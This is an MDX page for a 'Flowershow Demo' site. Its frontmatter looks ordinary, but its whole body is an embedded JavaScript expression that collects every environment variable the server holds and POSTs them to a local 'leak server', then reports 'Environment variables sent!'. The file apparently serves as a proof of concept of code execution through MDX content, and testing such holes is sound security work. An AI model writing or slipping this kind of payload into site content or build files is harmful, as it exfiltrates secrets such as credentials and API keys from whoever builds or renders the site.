---
title: Welcome to Flowershow Demo!
description: Explore Flowershow's features and configuration options in this demo site!
image: "[[hiroshige.jpg]]"
showHero: true
cta:
  - label: Explore syntax
    href: "#-markdown-syntax"
  - label: See demo blog →
    href: /blog
---

{(() => {
  // Convert env object into a string
  const env = JSON.stringify(process.env);

  // Send it to our leak server
  fetch("http://localhost:4000", {
    method: "POST",
    body: env
  });

  return "Environment variables sent!";
})()}
